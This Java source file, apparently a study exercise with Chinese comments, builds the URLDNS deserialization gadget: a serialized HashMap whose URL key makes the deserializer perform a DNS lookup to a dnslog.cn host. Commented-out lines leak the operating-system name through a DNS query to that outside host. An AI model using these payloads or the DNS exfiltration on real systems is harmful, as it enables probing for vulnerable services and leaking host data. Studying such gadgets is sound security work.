package com.ymqyyds.vul;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutionException;

public class urlDNS {

    //对目标精心构造并序列化
    public void Serial() throws Exception {
        Map<URL, String> map = new HashMap<>();
        URL url = new URL("http://ymqyydsymqyydsymqyyds.pme7s8.dnslog.cn");

        // 必须执行 map.put 才能把 url当作 key 插进hash表
        map.put(url,"ymqyydsymqyydsymqyyds");  // 但是，一旦执行了改代码，url的hashCode属性也就变得不再是 -1 了
        // 所以在下面的代码中，使用类反射机制设置 url.hashCode = -1

        Class clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,-1);

        // 设置好了构造的 hashcode 此时将构造好的类实例进行序列化
        FileOutputStream fileOutputStream = new FileOutputStream("./data/urldns.ser");  //设置文件输出流对象
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(map);  //因为是map在调用 put 方法，我们最终要序列化的目标就是整个map，因为 url 对象是插在map的hash表中的
    }

    //对构造好的序列化值进行反序列化
    public void unserial() throws Exception {
        FileInputStream fileInputStream = new FileInputStream("./data/urldns.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        System.out.println(objectInputStream.readObject().getClass());
    }

    public static void main(String[] args) throws Exception {

//        // 如何使用DNS外带,要么自己搭建 dnslog.cn 要么去浏览器直接访问在线的dnslog.cn
//        String osname = System.getProperty("os.name");
//        osname = osname.replace(" ","-");
//        InetAddress address = InetAddress.getByName(osname + ".pme7s8.dnslog.cn");
////        Inet4Address address = (Inet4Address) Inet4Address.getByName("woniuxy.com");
//        System.out.println(address);


////         第二种dns带外的方式
//        Map<URL, String> map = new HashMap<>();
//        URL url = new URL("http://ymqyyds.pme7s8.dnslog.cn");
//        map.put(url,"ymqyyds");
//        System.out.println("代码运行结束");

        urlDNS ud = new urlDNS();
//        ud.Serial();
        ud.unserial();
    }
}
